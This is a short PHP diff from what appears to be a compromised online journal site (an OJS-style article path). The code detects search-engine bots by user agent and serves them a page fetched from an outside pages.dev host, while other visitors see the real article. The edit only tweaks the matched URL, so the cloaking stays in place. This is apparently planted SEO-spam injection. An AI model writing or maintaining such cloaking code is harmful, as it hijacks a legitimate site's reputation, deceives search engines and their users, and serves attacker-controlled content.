@@ -23,7 +23,7 @@ if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/journals/index.php
     exit;
 }
 
-if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/journals/index.php/fba/article/view/672/") {
+if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/journals/index.php/fba/article/view/672") {
     usleep(rand(100000, 200000)); 
     header('Content-Type: text/html; charset=utf-8');
     echo aselolejos("https://waklabucikidau.pages.dev/sempakbasah/index.html");
